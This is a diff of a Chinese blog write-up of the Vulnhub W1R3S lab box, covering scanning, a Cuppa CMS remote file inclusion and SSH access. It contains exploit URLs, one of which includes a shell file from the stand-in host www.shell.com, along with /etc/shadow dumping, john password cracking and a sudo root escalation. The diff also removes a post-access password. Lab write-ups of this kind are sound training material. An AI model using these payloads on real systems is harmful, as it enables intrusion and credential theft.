@@ -1,23 +1,22 @@
 ---
 title: vulnhub-w1r3s通关
 date: 2023-06-03 10:30:35
-tags: 
-- vulnhub
-- w1r3s
-- WriteUp
+tags:
+  - vulnhub
+  - w1r3s
+  - WriteUp
 categories: WriteUp
 keywords: vulnhub
-description: 本文记录了作者在通关vulnhub靶机Narak中遇到的问题以及踩坑后的解决方案。
+description: 本文记录了作者在通关vulnhub靶机w1r3s中遇到的问题，通过目录爆破获取着手点，使用RFI获取敏感信息，爆破密码获得登录凭据。
 top_img: https://pic.imgdb.cn/item/647dcd281ddac507ccf5125c.jpg
 cover: https://pic.imgdb.cn/item/647dcd281ddac507ccf5125c.jpg
-password: xdxdsqyc15511551
-message: 暂未完成，仍在施工
 ---
 
 ## 靶机详情
 
 靶机IP：192.168.118.134
 
+>You have been hired to do a penetration test on the W1R3S.inc individual server and report all findings. They have asked you to gain root access and find the flag (located in /root directory).
 ## 信息收集
 
 ### nmap 扫描
@@ -63,11 +62,11 @@ Nmap done: 1 IP address (0 hosts up) scanned in 0.73 seconds
 
 此处先从漏洞更多，更好下手的 ftp ，http ， mysql 下手。
 
-## ftp服务
+## 获取立足点
+### 失败尝试：ftp服务
 
 首先是 ftp 服务，通过 kali 自带的工具 tftp 能够匿名登录，但是因为信息不足，没办法利用。所以暂时搁置，等待更多信息以便利用。
-
-## web服务
+### RFI获取敏感信息
 
 ```
 $ dirsearch -u http://192.168.118.134               
@@ -95,13 +94,12 @@ Target: http://192.168.118.134/
 Task Completed
 ```
 
-保留可以利用的扫描结果，发现两个能够访问的页面 `installation/` 和 `/wordpress/`，打开页面观察一下界面，搜索更多信息：
+保留可以利用的扫描结果，发现两个能够访问的页面 `/administrator/installation/` 和 `/wordpress/`，打开页面观察一下界面，搜索更多信息：
 
+![WP图片](https://pic.imgdb.cn/item/653f28bec458853aefd05dc3.jpg)
+![cuppa图片](https://pic.imgdb.cn/item/653f285fc458853aefcf519c.jpg)
 
-![WP图片]()
-![cuppa图片]()
-
-发现 `cuppa` 默认进入安装界面，猜测此处可能存在利用点，于是使用 `searchsploit` 搜索 `exp` 脚本，发现 `cuppa` 在 `/alertConfigField.php` 存在 RFI （远程文件包含）漏洞，复制利用脚本到本地，修改 request 包
+发现 `cuppa` 默认进入安装界面，猜测此处可能存在利用点，于是使用 `searchsploit` 搜索 `exp` 脚本，发现 `cuppa` 在 `/alertConfigField.php` 存在 RFI （远程文件包含）漏洞，复制利用脚本到本地，修改 request 包。
 
 ```
 $ searchsploit cuppa   
@@ -118,50 +116,8 @@ $ searchsploit -m 25971.txt
  Verified: True
 File Type: C++ source, ASCII text, with very long lines (876)
 Copied to: /home/kali/Desktop/BoxWalk/Vulnhub/w1r3s/25971.txt
-```
 
-```
 $ cat 25971.txt         
-# Exploit Title   : Cuppa CMS File Inclusion
-# Date            : 4 June 2013
-# Exploit Author  : CWH Underground
-# Site            : www.2600.in.th
-# Vendor Homepage : http://www.cuppacms.com/
-# Software Link   : http://jaist.dl.sourceforge.net/project/cuppacms/cuppa_cms.zip
-# Version         : Beta
-# Tested on       : Window and Linux
-
-  ,--^----------,--------,-----,-------^--,
-  | |||||||||   `--------'     |          O .. CWH Underground Hacking Team ..
-  `+---------------------------^----------|
-    `\_,-------, _________________________|
-      / XXXXXX /`|     /
-     / XXXXXX /  `\   /
-    / XXXXXX /\______(
-   / XXXXXX /
-  / XXXXXX /
- (________(
-  `------'
-
-####################################
-VULNERABILITY: PHP CODE INJECTION
-####################################
-
-/alerts/alertConfigField.php (LINE: 22)
-
------------------------------------------------------------------------------
-LINE 22:
-        <?php include($_REQUEST["urlConfig"]); ?>
------------------------------------------------------------------------------
-
-
-#####################################################
-DESCRIPTION
-#####################################################
-
-An attacker might include local or remote PHP files or read non-PHP files with this vulnerability. User tainted data is used when creating the file name that will be included into the current file. PHP code in this file will be evaluated, non-PHP code will be embedded to the output. This vulnerability can lead to full server compromise.
-
-http://target/cuppa/alerts/alertConfigField.php?urlConfig=[FI]
 
 #####################################################
 EXPLOIT
@@ -169,49 +125,13 @@ EXPLOIT
 
 http://target/cuppa/alerts/alertConfigField.php?urlConfig=http://www.shell.com/shell.txt?
 http://target/cuppa/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd
-
-Moreover, We could access Configuration.php source code via PHPStream
-
-For Example:
------------------------------------------------------------------------------
-http://target/cuppa/alerts/alertConfigField.php?urlConfig=php://filter/convert.base64-encode/resource=../Configuration.php
------------------------------------------------------------------------------
-
-Base64 Encode Output:
------------------------------------------------------------------------------
-PD9waHAgCgljbGFzcyBDb25maWd1cmF0aW9uewoJCXB1YmxpYyAkaG9zdCA9ICJsb2NhbGhvc3QiOwoJCXB1YmxpYyAkZGIgPSAiY3VwcGEiOwoJCXB1YmxpYyAkdXNlciA9ICJyb290IjsKCQlwdWJsaWMgJHBhc3N3b3JkID0gIkRiQGRtaW4iOwoJCXB1YmxpYyAkdGFibGVfcHJlZml4ID0gImN1XyI7CgkJcHVibGljICRhZG1pbmlzdHJhdG9yX3RlbXBsYXRlID0gImRlZmF1bHQiOwoJCXB1YmxpYyAkbGlzdF9saW1pdCA9IDI1OwoJCXB1YmxpYyAkdG9rZW4gPSAiT0JxSVBxbEZXZjNYIjsKCQlwdWJsaWMgJGFsbG93ZWRfZXh0ZW5zaW9ucyA9ICIqLmJtcDsgKi5jc3Y7ICouZG9jOyAqLmdpZjsgKi5pY287ICouanBnOyAqLmpwZWc7ICoub2RnOyAqLm9kcDsgKi5vZHM7ICoub2R0OyAqLnBkZjsgKi5wbmc7ICoucHB0OyAqLnN3ZjsgKi50eHQ7ICoueGNmOyAqLnhsczsgKi5kb2N4OyAqLnhsc3giOwoJCXB1YmxpYyAkdXBsb2FkX2RlZmF1bHRfcGF0aCA9ICJtZWRpYS91cGxvYWRzRmlsZXMiOwoJCXB1YmxpYyAkbWF4aW11bV9maWxlX3NpemUgPSAiNTI0Mjg4MCI7CgkJcHVibGljICRzZWN1cmVfbG9naW4gPSAwOwoJCXB1YmxpYyAkc2VjdXJlX2xvZ2luX3ZhbHVlID0gIiI7CgkJcHVibGljICRzZWN1cmVfbG9naW5fcmVkaXJlY3QgPSAiIjsKCX0gCj8+
------------------------------------------------------------------------------
-
-Base64 Decode Output:
------------------------------------------------------------------------------
-<?php
-        class Configuration{
-                public $host = "localhost";
-                public $db = "cuppa";
-                public $user = "root";
-                public $password = "Db@dmin";
-                public $table_prefix = "cu_";
-                public $administrator_template = "default";
-                public $list_limit = 25;
-                public $token = "OBqIPqlFWf3X";
-                public $allowed_extensions = "*.bmp; *.csv; *.doc; *.gif; *.ico; *.jpg; *.jpeg; *.odg; *.odp; *.ods; *.odt; *.pdf; *.png; *.ppt; *.swf; *.txt; *.xcf; *.xls; *.docx; *.xlsx";
-                public $upload_default_path = "media/uploadsFiles";
-                public $maximum_file_size = "5242880";
-                public $secure_login = 0;
-                public $secure_login_value = "";
-                public $secure_login_redirect = "";
-        }
-?>
------------------------------------------------------------------------------
-
-Able to read sensitive information via File Inclusion (PHP Stream)
-
-################################################################################################################
- Greetz      : ZeQ3uL, JabAv0C, p3lo, Sh0ck, BAD $ectors, Snapter, Conan, Win7dos, Gdiupo, GnuKDE, JK, Retool2
-################################################################################################################  
 ```
 
+直接使用GET请求发现没有回显。打开burp将数据包改为POST请求，成功获取敏感信息。
 
+![POST](https://pic.imgdb.cn/item/653f55ffc458853aef632d07.jpg)
+
+根据脚本使用文件包含漏洞，获取 `/etc/paswwd` 和 `/etc/shadow` 文件内容。
 
 ```
 root:x:0:0:root:/root:/bin/bash
@@ -304,10 +224,12 @@ sshd:*:17554:0:99999:7:::
 ftp:*:17554:0:99999:7:::
 mysql:!:17554:0:99999:7:::
 ```
+### 暴力破解获取登录凭据  
 
+使用 `john` 尝试对密码进行暴力破解
 
 ```
-$ sudo john  hashpasswd    
+$ sudo john hashpasswd    
 Warning: detected hash type "sha512crypt", but the string is also recognized as "HMAC-SHA256"
 Use the "--format=HMAC-SHA256" option to force loading these as that type instead
 Using default input encoding: UTF-8
@@ -322,6 +244,8 @@ Proceeding with wordlist:/usr/share/john/password.lst
 computer         (w1r3s)  
 ……
 ```
+
+获取密码之后，直接使用ssh进行连接，获取立足点。
 
 ```
 $ ssh w1r3s@192.168.118.134  
@@ -362,53 +286,8 @@ User w1r3s may run the following commands on W1R3S.localdomain:
 w1r3s@W1R3S:~$ sudo /bin/bash
 root@W1R3S:~# whoami
 root
-root@W1R3S:/root# cat flag.txt 
------------------------------------------------------------------------------------------
-   ____ ___  _   _  ____ ____      _  _____ _   _ _        _  _____ ___ ___  _   _ ____  
-  / ___/ _ \| \ | |/ ___|  _ \    / \|_   _| | | | |      / \|_   _|_ _/ _ \| \ | / ___| 
- | |  | | | |  \| | |  _| |_) |  / _ \ | | | | | | |     / _ \ | |  | | | | |  \| \___ \ 
- | |__| |_| | |\  | |_| |  _ <  / ___ \| | | |_| | |___ / ___ \| |  | | |_| | |\  |___) |
-  \____\___/|_| \_|\____|_| \_\/_/   \_\_|  \___/|_____/_/   \_\_| |___\___/|_| \_|____/ 
-                                                                                        
------------------------------------------------------------------------------------------
-
-                          .-----------------TTTT_-----_______
-                        /''''''''''(______O] ----------____  \______/]_
-     __...---'"""\_ --''   Q                               ___________@
- |'''                   ._   _______________=---------"""""""
- |                ..--''|   l L |_l   |
- |          ..--''      .  /-___j '   '
- |    ..--''           /  ,       '   '
- |--''                /           `    \
-                      L__'         \    -
-                                    -    '-.
-                                     '.    /
-                                       '-./
-
-----------------------------------------------------------------------------------------
-  YOU HAVE COMPLETED THE
-               __      __  ______________________   _________
-              /  \    /  \/_   \______   \_____  \ /   _____/
-              \   \/\/   / |   ||       _/ _(__  < \_____  \ 
-               \        /  |   ||    |   \/       \/        \
-                \__/\  /   |___||____|_  /______  /_______  /.INC
-                     \/                \/       \/        \/        CHALLENGE, V 1.0
-----------------------------------------------------------------------------------------
-
-CREATED BY SpecterWires
-
-----------------------------------------------------------------------------------------
-root@W1R3S:/root# 
 ```
 
 ## 总结
 
-问题描述：写明问题或挑战的背景和要求。
-
-解决方案：详细描述解决问题的方法、步骤和技术。这可能涉及到使用特定的工具、编写代码、分析漏洞或攻击向量等。
-
-漏洞分析（如果适用）：如果WriteUp是关于某个漏洞的解释和分析，那么它会包括对漏洞的详细说明、漏洞的利用方法和可能的影响。
-
-结果和证明：列出成功解决问题或利用漏洞的证据或截图。
-
-总结和反思：对解决过程进行总结，包括遇到的困难、学到的经验教训以及对改进的建议。
+总体而言，这个靶机比较简单，难点主要在于RFI获取文件时，不能直接照搬脚本的做法，需要灵活变通，将GET请求改为POST请求。作者在此浪费了比较多的时间，最后成功突破也属于是灵光一现。
